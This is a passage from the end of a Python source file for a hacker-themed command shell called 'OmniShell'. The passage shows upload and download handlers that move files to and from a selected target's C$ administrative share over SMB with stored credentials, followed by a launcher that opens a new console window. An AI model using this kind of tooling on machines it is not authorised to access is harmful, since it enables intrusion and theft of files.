                    self.control.smb_upload(target, src, "C$", dst.replace("C$\\", "").replace("C$:", ""), self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Uploaded to {target}")

            elif cmd == "download" and len(args) >= 1:
                target = self.selected_target
                remote = args[0]
                local = args[1] if len(args) > 1 else "downloaded_file"
                
                if args[0].count('.') >= 3:
                    target = args[0]
                    remote = args[1] if len(args) > 1 else ""
                    local = args[2] if len(args) > 2 else "downloaded_file"
                    
                if not target or not remote:
                    self._log(f"{Fore.RED}[!] Usage: download [ip] <remote> <local>")
                    return
                    
                if self.control and hasattr(self.control, 'smb_download'):
                    self.control.smb_download(target, "C$", remote.replace("C$\\", "").replace("C$:", ""), local, self.credentials["user"], self.credentials["pass"])
                    self._log(f"[+] Downloaded from {target}")

            # ==================== UNKNOWN ====================
            else:
                self._log(f"{Fore.RED}Unknown command: {cmd}. Type 'help' for 140+ commands.")

        except Exception as e:
            self._log(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    import sys
    import subprocess

    # Check if we're in a new window
    if len(sys.argv) > 1 and sys.argv[1] == "--new-window":
        # We're in the new window, run the CLI
        # Advanced hacking welcome sequence
        MatrixEffects.advanced_welcome()

        # Initialize and run the shell
        shell = OmniShell()
        shell.run()
    else:
        # Launch new command line window
        try:
            # Get the current Python executable and script path
            python_exe = sys.executable
            script_path = sys.argv[0]

            # Launch new maximized cmd window
            cmd = f'cmd /c start /max "" "{python_exe}" "{script_path}" --new-window'
            subprocess.Popen(cmd, shell=True)

            # Play launch sound and exit current process
            HackerSounds.access_granted()
            print(f"{Fore.GREEN}Launching Omniscience Command Interface...")
            time.sleep(1)
            sys.exit(0)
        except Exception as e:
            print(f"Failed to launch new window: {e}")
            # Fallback to current window
            MatrixEffects.intro_cycle(12)
            shell = OmniShell()
            shell.run()
